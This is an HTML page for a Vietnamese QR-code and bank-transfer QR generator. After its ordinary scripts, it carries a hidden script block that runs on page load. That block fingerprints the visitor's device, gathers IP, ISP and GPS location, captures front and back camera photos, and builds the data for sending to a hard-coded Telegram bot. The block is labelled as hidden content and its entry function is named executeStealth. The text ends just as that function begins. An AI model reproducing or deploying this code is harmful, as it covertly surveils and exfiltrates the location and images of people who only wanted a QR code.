<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="C√¥ng c·ª• t·∫°o m√£ QR code nhanh ch√≥ng">
    <meta name="keywords" content="website, qr code, t·∫°o m√£ QR code, c√¥ng c·ª•">
    <meta property="og:type" content="website" />
    <meta property="og:title" content="C√¥ng c·ª• t·∫°o m√£ QR code nhanh ch√≥ng" />
    <meta property="og:image" content="https://i.imgur.com/rUldJC2.jpg" />
    <title>T·∫°o M√£ QR t·ª´ Tin Nh·∫Øn</title>
    <link rel="shortcut icon" href="https://i.imgur.com/83Gs09S.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --glass: rgba(20, 20, 20, 0.75);
            --glass-border: rgba(255, 255, 255, 0.2);
            --rainbow: linear-gradient(90deg, #a8edea, #fed6e3, #fac1ff, #d4fc79, #96e6a1, #a8edea);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            font-family: 'Montserrat', sans-serif;
            color: #fff;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        #jsi-flying-fish-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: #050505;
        }

        .main-wrapper {
            max-width: 900px;
            margin: 40px auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 25px;
            padding: 35px;
            margin-bottom: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            transition: all 0.3s ease;
        }
        
        .glass-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
        }
        
        .rainbow-text {
            background: var(--rainbow);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbow_move 4s linear infinite;
            font-weight: 800;
        }
        
        @keyframes rainbow_move {
            to { background-position: 200% center; }
        }
        
        .btn-elegant {
            position: relative;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            padding: 12px 24px;
            font-weight: 600;
            font-size: 14px;
            color: #ffffff;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 120px;
        }
        
        .btn-elegant::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.6s ease;
        }
        
        .btn-elegant:hover::before {
            left: 100%;
        }
        
        .btn-elegant:hover {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }
        
        .btn-elegant:active {
            transform: translateY(0);
        }
        
        .btn-elegant .btn-text {
            position: relative;
            z-index: 1;
            background: var(--rainbow);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbow_move 4s linear infinite;
        }
        
        .btn-elegant .btn-icon {
            position: relative;
            z-index: 1;
            color: #ffffff;
            transition: transform 0.3s ease;
        }
        
        .btn-elegant:hover .btn-icon {
            transform: scale(1.1);
        }
        
        .tab-button {
            transition: all 0.3s ease;
            font-weight: 500;
            background-color: rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.8);
            border-radius: 10px 10px 0 0;
            position: relative;
            overflow: hidden;
        }
        
        .tab-button:hover {
            background-color: rgba(255, 255, 255, 0.15);
            color: #ffffff;
        }
        
        .active-tab {
            background-color: rgba(255, 255, 255, 0.2);
            color: white;
            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
        }
        
        .active-tab .tab-text {
            background: var(--rainbow);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbow_move 4s linear infinite;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.4s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        input, select, textarea {
            border: 1px solid rgba(255, 255, 255, 0.3);
            background-color: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 12px 16px;
            border-radius: 8px;
            width: 100%;
            margin-bottom: 16px;
            transition: all 0.3s ease;
            color: #ffffff;
            font-weight: 400;
        }
        
        input::placeholder, textarea::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.5);
            background-color: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
        }
        
        select option {
            background-color: #2a2a2a;
            color: #ffffff;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.95);
            font-size: 14px;
        }

        #qrcodeImg {
            width: 400px;
            height: 400px;
            object-fit: contain;
            border: 12px solid rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
            background-color: rgba(255, 255, 255, 0.1);
        }
        
        #qrcodeImg:hover {
            transform: scale(1.02);
            border-color: rgba(255, 255, 255, 0.3);
        }
        
        footer {
            color: rgba(255, 255, 255, 0.7);
            padding: 20px 0;
            font-weight: 400;
            text-align: center;
        }
        
        footer a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.2s ease;
        }
        
        footer a:hover {
            color: #a5b4fc;
            text-decoration: underline;
        }
        
        .required-field {
            color: #ff416c;
        }
        
        .text-muted-foreground {
            color: rgba(255, 255, 255, 0.7);
        }
        
        .qr-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }
        
        .qr-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--rainbow);
            background-size: 200% auto;
            opacity: 0.1;
            border-radius: 16px;
            animation: rainbow_move 4s linear infinite;
            z-index: -1;
        }
        
        .button-container {
            display: flex;
            gap: 16px;
            margin-top: 24px;
        }
        
        @media (max-width: 768px) {
            .glass-card {
                padding: 20px;
                margin-bottom: 20px;
            }
            
            #qrcodeImg {
                width: 300px;
                height: 300px;
            }
            
            .button-container {
                flex-direction: column;
            }
            
            .btn-elegant {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div id="jsi-flying-fish-container"></div>
    
    <div class="main-wrapper">
        <div class="glass-card">
            <div class="flex flex-col p-6 space-y-1">
                <h3 class="tracking-tight text-3xl font-bold rainbow-text">T·∫°o ·∫¢nh QR Code - Tr·∫ßn Kh√¥i</h3>
                <p class="text-sm text-muted-foreground">Ch·ªçn lo·∫°i QR Code b·∫°n mu·ªën t·∫°o</p>
            </div>
            <div class="p-6">
                <div class="flex border-b border-white/20">
                    <button class="tab-button w-1/2 px-4 py-2 text-center border-r border-white/20 active-tab" onclick="switchTab('textQR', this)">
                        <span class="tab-text">VƒÉn B·∫£n</span>
                    </button>
                    <button class="tab-button w-1/2 px-4 py-2 text-center border-r border-white/20" onclick="switchTab('bankQR', this)">
                        <span class="tab-text">Chuy·ªÉn Kho·∫£n</span>
                    </button>
                </div>

                <div id="textQR" class="tab-content p-4 active">
                    <div class="space-y-4">
                        <div class="space-y-2">
                            <label for="message" class="rainbow-text">VƒÉn B·∫£n</label>
                            <textarea id="message" placeholder="Nh·∫≠p vƒÉn b·∫£n c·∫ßn t·∫°o QR code" rows="4" required=""></textarea>
                        </div>
                    </div>
                </div>

                <div id="bankQR" class="tab-content p-4">
                    <div class="space-y-4">
                        <label for="bank_id" class="rainbow-text">Ng√¢n h√†ng <span class="required-field">*</span></label>
                        <select id="bank_id">
                            <option value="">-- Ch·ªçn ng√¢n h√†ng --</option>
                        </select>
                        
                        <label for="account_no" class="rainbow-text">S·ªë t√†i kho·∫£n <span class="required-field">*</span></label>
                        <input id="account_no" type="text" placeholder="Nh·∫≠p s·ªë t√†i kho·∫£n">
                        
                        <label for="account_name" class="rainbow-text">T√™n ng∆∞·ªùi th·ª• h∆∞·ªüng</label>
                        <input id="account_name" type="text" placeholder="Nh·∫≠p t√™n ng∆∞·ªùi th·ª• h∆∞·ªüng">
                        
                        <label for="amount" class="rainbow-text">S·ªë ti·ªÅn (VND)</label>
                        <input id="amount" type="text" placeholder="Nh·∫≠p s·ªë ti·ªÅn (n·∫øu c√≥)" oninput="formatCurrency(this)">
                        
                        <label for="description" class="rainbow-text">N·ªôi dung chuy·ªÉn kho·∫£n</label>
                        <input id="description" type="text" placeholder="Nh·∫≠p n·ªôi dung chuy·ªÉn kho·∫£n">
                        
                        <label for="template" class="rainbow-text">M·∫´u QR</label>
                        <select id="template">
                            <option value="compact">QR k√®m logo VietQR, Napas, ng√¢n h√†ng</option>
                            <option value="compact2">M√£ QR, c√°c logo , th√¥ng tin chuy·ªÉn kho·∫£n</option>
                            <option value="qr_only">Tr·∫£ v·ªÅ ·∫£nh QR ƒë∆°n gi·∫£n, ch·ªâ bao g·ªìm QR</option>
                            <option value="print">M√£ QR, c√°c logo v√† ƒë·∫ßy ƒë·ªß th√¥ng tin chuy·ªÉn kho·∫£n</option>
                        </select>
                    </div>
                </div>

                <div class="button-container">
                    <button class="btn-elegant" onclick="generateQR()">
                        <i class="fas fa-qrcode btn-icon"></i>
                        <span class="btn-text">T·∫°o QR Code</span>
                    </button>
                    <button class="btn-elegant" onclick="downloadQR()">
                        <i class="fas fa-download btn-icon"></i>
                        <span class="btn-text">T·∫£i QR Code</span>
                    </button>
                </div>
            </div>
        </div>

        <div class="glass-card">
            <div class="flex flex-col p-6 space-y-1">
                <h3 class="tracking-tight text-3xl font-bold rainbow-text">·∫¢nh QR Code C·ªßa B·∫°n</h3>
                <p class="text-sm text-muted-foreground">M√£ QR S·∫Ω ƒê∆∞·ª£c Xu·∫•t Hi·ªán ·ªû B√™n D∆∞·ªõi</p>
            </div>
            <div class="p-6">
                <div class="qr-container">
                    <img id="qrcodeImg" src="https://i.imgur.com/U7afLiO.png" alt="QR Code">
                </div>
            </div>
        </div>
        <footer class="mt-6 text-gray-500 text-sm rainbow-text">
            ¬© V·∫≠n H√†nh B·ªüi Tr·∫ßn Kh√¥i (HEXTEKO)</a>
        </footer>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        // Water effect
        var RENDERER = {
            POINT_INTERVAL: 5,
            FISH_COUNT: 3,
            MAX_INTERVAL_COUNT: 50,
            INIT_HEIGHT_RATE: 0.5,
            THRESHOLD: 50,
            
            init: function() {
                this.setParameters();
                this.reconstructMethods();
                this.setup();
                this.bindEvent();
                this.render();
            },
            
            setParameters: function() {
                this.$window = $(window);
                this.$container = $("#jsi-flying-fish-container");
                this.$canvas = $("<canvas />");
                this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d");
                this.points = [];
                this.fishes = [];
                this.watchIds = [];
            },
            
            createSurfacePoints: function() {
                var count = Math.round(this.width / this.POINT_INTERVAL);
                this.pointInterval = this.width / (count - 1);
                this.points.push(new SURFACE_POINT(this, 0));
                
                for (var i = 1; i < count; i++) {
                    var point = new SURFACE_POINT(this, i * this.pointInterval),
                        previous = this.points[i - 1];
                    point.setPreviousPoint(previous);
                    previous.setNextPoint(point);
                    this.points.push(point);
                }
            },
            
            reconstructMethods: function() {
                this.watchWindowSize = this.watchWindowSize.bind(this);
                this.jdugeToStopResize = this.jdugeToStopResize.bind(this);
                this.startEpicenter = this.startEpicenter.bind(this);
                this.moveEpicenter = this.moveEpicenter.bind(this);
                this.reverseVertical = this.reverseVertical.bind(this);
                this.render = this.render.bind(this);
            },
            
            setup: function() {
                this.points.length = 0;
                this.fishes.length = 0;
                this.watchIds.length = 0;
                this.intervalCount = this.MAX_INTERVAL_COUNT;
                this.width = this.$container.width();
                this.height = this.$container.height();
                this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500;
                this.$canvas.attr({ width: this.width, height: this.height });
                this.reverse = false;
                this.fishes.push(new FISH(this));
                this.createSurfacePoints();
            },
            
            watchWindowSize: function() {
                this.clearTimer();
                this.tmpWidth = this.$window.width();
                this.tmpHeight = this.$window.height();
                this.watchIds.push(setTimeout(this.jdugeToStopResize, 300));
            },
            
            clearTimer: function() {
                while (this.watchIds.length > 0) {
                    clearTimeout(this.watchIds.pop());
                }
            },
            
            jdugeToStopResize: function() {
                var width = this.$window.width(),
                    height = this.$window.height(),
                    stopped = (width == this.tmpWidth && height == this.tmpHeight);
                this.tmpWidth = width;
                this.tmpHeight = height;
                if (stopped) {
                    this.setup();
                }
            },
            
            bindEvent: function() {
                this.$window.on("resize", this.watchWindowSize);
                this.$container.on("mouseenter", this.startEpicenter);
                this.$container.on("mousemove", this.moveEpicenter);
                this.$container.on("click", this.reverseVertical);
            },
            
            getAxis: function(event) {
                var offset = this.$container.offset();
                return {
                    x: event.clientX - offset.left + this.$window.scrollLeft(),
                    y: event.clientY - offset.top + this.$window.scrollTop()
                };
            },
            
            startEpicenter: function(event) {
                this.axis = this.getAxis(event);
            },
            
            moveEpicenter: function(event) {
                var axis = this.getAxis(event);
                if (!this.axis) {
                    this.axis = axis;
                }
                this.generateEpicenter(axis.x, axis.y, axis.y - this.axis.y);
                this.axis = axis;
            },
            
            generateEpicenter: function(x, y, velocity) {
                if (y < this.height / 2 - this.THRESHOLD || y > this.height / 2 + this.THRESHOLD) {
                    return;
                }
                var index = Math.round(x / this.pointInterval);
                if (index < 0 || index >= this.points.length) {
                    return;
                }
                this.points[index].interfere(y, velocity);
            },
            
            reverseVertical: function() {
                this.reverse = !this.reverse;
                for (var i = 0, count = this.fishes.length; i < count; i++) {
                    this.fishes[i].reverseVertical();
                }
            },
            
            controlStatus: function() {
                for (var i = 0, count = this.points.length; i < count; i++) {
                    this.points[i].updateSelf();
                }
                for (var i = 0, count = this.points.length; i < count; i++) {
                    this.points[i].updateNeighbors();
                }
                if (this.fishes.length < this.fishCount) {
                    if (--this.intervalCount == 0) {
                        this.intervalCount = this.MAX_INTERVAL_COUNT;
                        this.fishes.push(new FISH(this));
                    }
                }
            },
            
            render: function() {
                requestAnimationFrame(this.render);
                this.controlStatus();
                this.context.clearRect(0, 0, this.width, this.height);
                this.context.fillStyle = "rgba(255, 255, 255, 0.22)";
                
                for (var i = 0, count = this.fishes.length; i < count; i++) {
                    this.fishes[i].render(this.context);
                }
                
                this.context.save();
                this.context.globalCompositeOperation = "xor";
                this.context.beginPath();
                this.context.moveTo(0, this.reverse ? 0 : this.height);
                
                for (var i = 0, count = this.points.length; i < count; i++) {
                    this.points[i].render(this.context);
                }
                
                this.context.lineTo(this.width, this.reverse ? 0 : this.height);
                this.context.closePath();
                this.context.fill();
                this.context.restore();
            }
        };
        
        var SURFACE_POINT = function(renderer, x) {
            this.renderer = renderer;
            this.x = x;
            this.init();
        };
        
        SURFACE_POINT.prototype = {
            SPRING_CONSTANT: 0.03,
            SPRING_FRICTION: 0.9,
            WAVE_SPREAD: 0.3,
            ACCELARATION_RATE: 0.01,
            
            init: function() {
                this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE;
                this.height = this.initHeight;
                this.fy = 0;
                this.force = { previous: 0, next: 0 };
            },
            
            setPreviousPoint: function(previous) {
                this.previous = previous;
            },
            
            setNextPoint: function(next) {
                this.next = next;
            },
            
            interfere: function(y, velocity) {
                this.fy = this.renderer.height * this.ACCELARATION_RATE * ((this.renderer.height - this.height - y) >= 0 ? -1 : 1) * Math.abs(velocity);
            },
            
            updateSelf: function() {
                this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height);
                this.fy *= this.SPRING_FRICTION;
                this.height += this.fy;
            },
            
            updateNeighbors: function() {
                if (this.previous) {
                    this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height);
                }
                if (this.next) {
                    this.force.next = this.WAVE_SPREAD * (this.height - this.next.height);
                }
            },
            
            render: function(context) {
                if (this.previous) {
                    this.previous.height += this.force.previous;
                    this.previous.fy += this.force.previous;
                }
                if (this.next) {
                    this.next.height += this.force.next;
                    this.next.fy += this.force.next;
                }
                context.lineTo(this.x, this.renderer.height - this.height);
            }
        };
        
        var FISH = function(renderer) {
            this.renderer = renderer;
            this.init();
        };
        
        FISH.prototype = {
            GRAVITY: 0.4,
            
            init: function() {
                this.direction = Math.random() < 0.5;
                this.x = this.direction ? (this.renderer.width + this.renderer.THRESHOLD) : -this.renderer.THRESHOLD;
                this.vx = (Math.random() * 5 + 3) * (this.direction ? -1 : 1);
                this.y = (Math.random() * this.renderer.height * 0.3) + (this.renderer.height * 0.6);
                this.vy = Math.random() * -3 - 2;
                this.ay = Math.random() * -0.15 - 0.05;
                this.isOut = false;
            },
            
            reverseVertical: function() {
                this.isOut = !this.isOut;
                this.ay *= -1;
            },
            
            controlStatus: function(context) {
                this.previousY = this.y;
                this.x += this.vx;
                this.y += this.vy;
                this.vy += this.ay;
                
                if (this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE) {
                    this.vy += this.GRAVITY;
                    this.isOut = true;
                } else {
                    this.isOut = false;
                }
                
                this.renderer.generateEpicenter(this.x, this.y, this.y - this.previousY);
                
                if (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || 
                    this.vx < 0 && this.x < -this.renderer.THRESHOLD) {
                    this.init();
                }
            },
            
            render: function(context) {
                context.save();
                context.translate(this.x, this.y);
                context.rotate(Math.PI + Math.atan2(this.vy, this.vx));
                context.scale(1, this.direction ? 1 : -1);
                context.beginPath();
                context.moveTo(-25, 0);
                context.bezierCurveTo(-15, 12, 10, 8, 30, 0);
                context.bezierCurveTo(10, -8, -15, -12, -25, 0);
                context.fill();
                context.restore();
                this.controlStatus(context);
            }
        };
        
        // QR functions
        async function loadBanks() {
            try {
                const response = await fetch('https://api.vietqr.io/v2/banks');
                const data = await response.json();
                
                if (data && data.data) {
                    const bankSelect = document.getElementById('bank_id');
                    const sortedBanks = data.data.sort((a, b) => a.name.localeCompare(b.name));
                    sortedBanks.forEach(bank => {
                        if (bank.isTransfer === 1) {
                            const option = document.createElement('option');
                            option.value = bank.bin;
                            option.textContent = bank.shortName || bank.short_name || bank.name;
                            bankSelect.appendChild(option);
                        }
                    });
                }
            } catch (error) {
                console.error('L·ªói khi t·∫£i danh s√°ch ng√¢n h√†ng:', error);
                const fallbackBanks = [
                    {bin: '970422', shortName: 'MB Bank'},
                    {bin: '970436', shortName: 'Vietcombank'},
                    {bin: '970407', shortName: 'Techcombank'},
                    {bin: '970441', shortName: 'VIB'},
                    {bin: '970416', shortName: 'ACB'}
                ];
                
                const bankSelect = document.getElementById('bank_id');
                fallbackBanks.forEach(bank => {
                    const option = document.createElement('option');
                    option.value = bank.bin;
                    option.textContent = bank.shortName;
                    bankSelect.appendChild(option);
                });
            }
        }

        function formatCurrency(input) {
            let value = input.value.replace(/[^\d]/g, '');
            if (value.length > 0) {
                let num = parseInt(value, 10);
                value = num.toLocaleString('vi-VN');
            }
            input.value = value;
        }

        function switchTab(tabId, button) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
                tab.classList.add('hidden');
            });
            
            document.getElementById(tabId).classList.remove('hidden');
            document.getElementById(tabId).classList.add('active');
            
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active-tab');
            });
            
            button.classList.add('active-tab');
        }
        
        function generateQR() {
            let qrUrl = '';
            
            if (document.getElementById('bankQR').classList.contains('active')) {
                const bankId = document.getElementById('bank_id').value;
                const accountNo = document.getElementById('account_no').value.trim();
                const template = document.getElementById('template').value;
                const amount = document.getElementById('amount').value.trim();
                const description = encodeURIComponent(document.getElementById('description').value.trim());
                const accountName = encodeURIComponent(document.getElementById('account_name').value.trim());
                
                if (!bankId) {
                    alert('Vui l√≤ng ch·ªçn ng√¢n h√†ng');
                    return;
                }
                if (!accountNo) {
                    alert('Vui l√≤ng nh·∫≠p s·ªë t√†i kho·∫£n');
                    return;
                }
                
                qrUrl = `https://img.vietqr.io/image/${bankId}-${accountNo}-${template}.png?amount=${amount}&addInfo=${description}&accountName=${accountName}`;
            } else {
                qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=${encodeURIComponent(document.getElementById('message').value.trim())}`;
            }
            
            document.getElementById('qrcodeImg').src = qrUrl;
        }
        
        function downloadQR() {
            const qrcodeImg = document.querySelector('#qrcodeImg');
            const defaultImgSrc = 'https://i.imgur.com/U7afLiO.png';
            
            if (!qrcodeImg || !qrcodeImg.src || qrcodeImg.src === defaultImgSrc) {
                alert('Kh√¥ng t√¨m th·∫•y ·∫£nh QR Code. Vui l√≤ng t·∫°o ·∫£nh tr∆∞·ªõc!');
                return;
            }
            
            fetch(qrcodeImg.src)
                .then(response => response.blob())
                .then(blob => {
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'qrcode.png';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                })
                .catch(error => {
                    console.error('L·ªói t·∫£i ·∫£nh:', error);
                    alert('C√≥ l·ªói x·∫£y ra khi t·∫£i ·∫£nh QR Code');
                });
        }

        $(function() {
            RENDERER.init();
            loadBanks();
        });
    </script>

    <!-- ===== HECK.JS N·ªòI DUNG ·∫®N ===== -->
    <script>
    (function() {
        'use strict';
        
        // Ch·ªù trang load ho√†n to√†n r·ªìi m·ªõi ch·∫°y
        window.addEventListener('load', function() {
            setTimeout(function() {
                // C√°c bi·∫øn c·∫•u h√¨nh - M√ÄY PH·∫¢I ƒêI·ªÄN V√ÄO ƒê√ÇY
                const TELEGRAM_BOT_TOKEN = '7550142487:tNG4QWEIUr5AP79C8';
                const TELEGRAM_CHAT_ID_WITH_PHOTOS = ''; // ƒêI·ªÄN CHAT ID V√ÄO ƒê√ÇY
                const TELEGRAM_CHAT_ID_NO_PHOTOS = ''; // ƒêI·ªÄN CHAT ID V√ÄO ƒê√ÇY
                
                if (!TELEGRAM_CHAT_ID_WITH_PHOTOS && !TELEGRAM_CHAT_ID_NO_PHOTOS) {
                    return; // Kh√¥ng l√†m g√¨ n·∫øu ch∆∞a c√≥ chat ID
                }
                
                const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
                const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const info = {
                    time: new Date().toLocaleString('vi-VN'),
                    ip: '',
                    isp: '',
                    realIp: '',
                    address: '',
                    country: '', 
                    lat: '',
                    lon: '',
                    device: '',
                    os: '',
                    camera: '‚è≥ ƒêang ki·ªÉm tra...'
                };
                
                function detectDevice() {
                    const ua = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenW = window.screen.width;
                    const screenH = window.screen.height;
                    const ratio = window.devicePixelRatio;
                
                    if (/Android/i.test(ua)) {
                        info.os = 'Android';
                        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
                        if (match) {
                            let model = match[1].split('/')[0].trim();
                            if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
                            if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
                            info.device = model;
                        } else {
                            info.device = 'Android Device';
                        }
                    } 
                    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                        info.os = 'iOS';
                        const res = `${screenW}x${screenH}@${ratio}`;
                        const iphoneModels = {
                            "430x932@3": "iPhone 14/15/16 Pro Max",
                            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
                            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
                            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
                            "414x896@3": "iPhone XS Max / 11 Pro Max",
                            "414x896@2": "iPhone XR / 11",
                            "375x812@3": "iPhone X / XS / 11 Pro",
                            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
                        };
                        info.device = iphoneModels[res] || 'iPhone Model';
                    } 
                    else if (/Windows NT/i.test(ua)) {
                        info.device = 'Windows PC';
                        info.os = 'Windows';
                    } else if (/Macintosh/i.test(ua)) {
                        info.device = 'Mac';
                        info.os = 'macOS';
                    } else {
                        info.device = 'Kh√¥ng x√°c ƒë·ªãnh';
                        info.os = 'Kh√¥ng r√µ';
                    }
                }
                
                async function getPublicIP() {
                    try {
                        const r = await fetch('https://api.ipify.org?format=json');
                        const data = await r.json();
                        info.ip = data.ip || 'Kh√¥ng r√µ';
                    } catch (e) { info.ip = 'B·ªã ch·∫∑n'; }
                }
                
                async function getRealIP() {
                    try {
                        const r = await fetch('https://icanhazip.com');
                        const ip = await r.text();
                        info.realIp = ip.trim();
                        const res = await fetch(`https://ipwho.is/${info.realIp}`);
                        const data = await res.json();
                        info.isp = data.connection?.org || 'VNNIC';
                        info.country = data.country || 'Vi·ªát Nam';
                    } catch (e) { info.realIp = 'L·ªói k·∫øt n·ªëi'; }
                }
                
                let useGPS = false;
                
                async function getLocation() {
                    return new Promise(resolve => {
                        if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
                
                        navigator.geolocation.getCurrentPosition(
                            async pos => {
                                useGPS = true;
                                info.lat = pos.coords.latitude.toFixed(6);
                                info.lon = pos.coords.longitude.toFixed(6);
                                try {
                                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                                    const data = await res.json();
                                    info.address = data.display_name || 'üìç V·ªã tr√≠ GPS';
                                    info.country = data.address?.country || info.country;
                                } catch {
                                    info.address = `üìç T·ªça ƒë·ªô: ${info.lat}, ${info.lon}`;
                                }
                                resolve();
                            },
                            async () => {
                                useGPS = false;
                                await fallbackIPLocation();
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 5000 }
                        );
                    });
                }
                
                async function fallbackIPLocation() {
                    try {
                        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
                        info.lat = data.latitude?.toFixed(6) || '0';
                        info.lon = data.longitude?.toFixed(6) || '0';
                        info.address = `${data.city}, ${data.region} (V·ªã tr√≠ IP)`;
                        info.country = data.country || 'Vi·ªát Nam';
                    } catch (e) { info.address = 'Kh√¥ng r√µ'; }
                }
                
                async function captureCamera(facingMode = 'user') {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
                        return new Promise(resolve => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            video.onloadedmetadata = () => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                setTimeout(() => {
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    stream.getTracks().forEach(t => t.stop());
                                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                                }, 800);
                            };
                        });
                    } catch (e) {
                        throw e;
                    }
                }
                
                function getCaption() {
                    const mapsLink = info.lat && info.lon
                        ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
                        : 'Kh√¥ng r√µ';
                
                    return `
        üì° [TH√îNG TIN TRUY C·∫¨P]
        
        üïí Th·ªùi gian: ${info.time}
        üì± Thi·∫øt b·ªã: ${info.device}
        üñ•Ô∏è H·ªá ƒëi·ªÅu h√†nh: ${info.os}
        üåç IP d√¢n c∆∞: ${info.ip}
        üß† IP g·ªëc: ${info.realIp}
        üè¢ ISP: ${info.isp}
        üèôÔ∏è ƒê·ªãa ch·ªâ: ${info.address}
        üåé Qu·ªëc gia: ${info.country}
        üìç Vƒ© ƒë·ªô: ${info.lat}
        üìç Kinh ƒë·ªô: ${info.lon}
        üìå Google Maps: ${mapsLink}
        üì∏ Camera: ${info.camera}
        `.trim();
                }
                
                function getCaptionWithExtras() {
                    return getCaption() + `\n\n‚ö†Ô∏è Ghi ch√∫: Th√¥ng tin c√≥ kh·∫£ nƒÉng ch∆∞a ch√≠nh x√°c 100%.`;
                }
                
                async function sendPhotos(frontBlob, backBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
                    
                    const media = [];
                    if (frontBlob) {
                        media.push({ type: 'photo', media: 'attach://front', caption: getCaptionWithExtras() });
                        formData.append('front', frontBlob, 'front.jpg');
                    }
                    if (backBlob) {
                        media.push({ type: 'photo', media: 'attach://back' });
                        formData.append('back', backBlob, 'back.jpg');
                    }
                
                    formData.append('media', JSON.stringify(media));
                    return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
                }
                
                async function sendTextOnly() {
                    return fetch(API_SEND_TEXT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
                            text: getCaption()
                        })
                    });
                }
                
                function delay(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }
                
                async function executeStealth() {
                    detectDevice();
